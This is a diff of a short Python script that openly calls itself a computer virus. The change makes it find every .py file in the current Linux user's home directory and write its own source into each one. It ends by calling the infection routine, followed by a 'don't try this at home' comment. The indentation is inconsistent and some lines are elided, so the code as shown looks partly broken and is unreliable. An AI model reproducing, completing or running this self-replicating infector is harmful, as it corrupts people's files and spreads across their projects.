@@ -1,22 +1,34 @@
-# importing impirtant libarys to create our new python computer virus
+# importing important libarys to create our new python computer virus
 
 import glob
 import os
+import getpass
+import platform
 
 # finding files which we want to infect
 
 def files_to_infect():
-    files_list = glob.glob('*.py')
-    return file_list.remove(__file__)
+    current_file = __file__
 
-# getting virus code to cpoy itself to another python files
+    if platform.system() == 'Linux':
+    
+     files_list = glob.glob('/home/{}/*.py'.format(getpass.getuser()))
+     files_list.remove(current_file)
+
+     return files_list
+
+   else:
+       pass
+        
+
+# getting virus code to copy itself to another python files
 
 def get_virus_code():
     file = open(__file__,'r')
     virus = file.read()
     return virus
 
-# copying virus by help of over writing the virus code
+# copying virus by help of appending the virus code
 
 def copy_virus(content):
  for files in files_to_infect():
@@ -48,3 +60,4 @@ def final_virus():
 final_virus()
 
 # don't try this at home "A HARMFULL RISK FOR COMPUTER CAN BE HAPPEN"
+
